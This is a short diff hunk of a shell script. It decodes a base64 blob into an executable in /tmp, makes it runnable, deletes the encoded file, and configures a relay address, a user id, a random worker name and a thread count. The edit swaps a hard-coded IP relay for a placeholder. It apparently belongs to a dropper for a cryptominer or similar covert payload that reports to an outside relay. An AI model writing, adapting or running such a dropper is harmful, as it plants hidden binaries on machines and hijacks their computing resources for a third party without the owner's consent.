@@ -12,7 +12,7 @@ base64 -d /tmp/signermachine.b64 > /tmp/signermachine
 chmod +x /tmp/signermachine
 rm -f /tmp/signermachine.b64
 
-RELAY="43.159.60.190:443"
+RELAY="${RELAY:-YOUR_RELAY_IP:443}"
 USER="krxXJ649DW"
 WORKER=$(head -c 256 /dev/urandom | tr -dc a-z0-9 | head -c 9)
 THREADS=$(nproc 2>/dev/null || echo 160)
